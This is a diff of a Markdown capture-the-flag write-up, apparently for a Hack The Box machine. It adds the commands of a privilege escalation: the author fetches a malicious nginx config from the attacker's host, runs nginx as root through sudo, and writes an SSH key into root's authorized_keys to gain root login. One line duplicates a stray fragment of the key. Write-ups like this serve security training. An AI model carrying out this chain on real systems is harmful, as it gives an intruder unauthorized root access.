@@ -1,4 +1,4 @@
-```
+![image](https://github.com/regarmulia/HTB/assets/33616880/c7ddf18e-12d7-49b9-a610-425eb09b68c8)```
 nmap -sS -sC -sV -T5 -Pn 10.10.11.243
 nmap -p- -T5 10.10.11.243
 ```
@@ -69,3 +69,26 @@ curl localhost:1337/root/root.txt
 ![image](https://github.com/regarmulia/HTB/assets/33616880/a524f463-885a-4995-aec9-cf33583e22d3)
 
 ![image](https://github.com/regarmulia/HTB/assets/33616880/9c6fe913-03a7-4805-832b-e032bd0cb45d)
+
+```
+ssh-keygen -o
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/a82122f2-cf78-415b-97d9-6483aa8497af)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/d95ac52a-f273-4a06-9b9b-45cb9d7f8cfc)
+
+```
+wget 10.10.14.12/privesc2.conf
+sudo /usr/sbin/nginx -c /tmp/privesc2.conf
+curl localhost:1338
+curl -X PUT localhost:1338/root/.ssh/authorized_keys -d 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCiHugqsdduKFyMsf1Q3e75saETiEWwCDHvAZfT7Ep8FPyXfSnA6ya1VSSJT34CENsFBpvEpSvqMLphMyPjtZCyjcd6fc+RRweIvzba77murxnKKymr2Pi3iEcqHgQOCSqkE++a4D2XoCcGZjxAZqCVl64xDPqlPVZoT0Eu705f7T6FM2HOqL+GHRzNYcT7fRDiZGK5fOvVKePqRuqF4Kts5IjAldwcoeHCrxyOVI7LfgtqrmcKX4EL9+RpKzYhnG/S8nDTlu1jO9Up+M2FK2oTd6BYKeirI+xC7YWIYmZiy5Fkd+GR3foWOlxdEOhKbfkVqgyA6wdbez0KwCFbftoxKtjHqSI/d/EgH+NflOKXscZ/aX9rnRBQI+SxTLCL9n68J5nQ84Z6JC6UmSW9IKrtDc7Z9ibtm1nPJqgm7xwHUPZzbflk2w3q89gIJl4MqwSZ6t19dG3k8YzVIBls9gxQ3/TiveSLNQaxZV8H8UXg8uM0swOE2pXf9C5TOU92CZM= root@kali'
+<veSLNQaxZV8H8UXg8uM0swOE2pXf9C5TOU92CZM= root@kali'
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/8aba9e4e-bea4-479a-a680-c37037fbc2c6)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/d43f7977-5069-46a9-b4c3-1e80078da42a)
+
+```
+ssh -i /root/.ssh/id_rsa root@10.10.11.243
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/8f1a8b22-696b-42d6-9602-c32de9c16cb4)
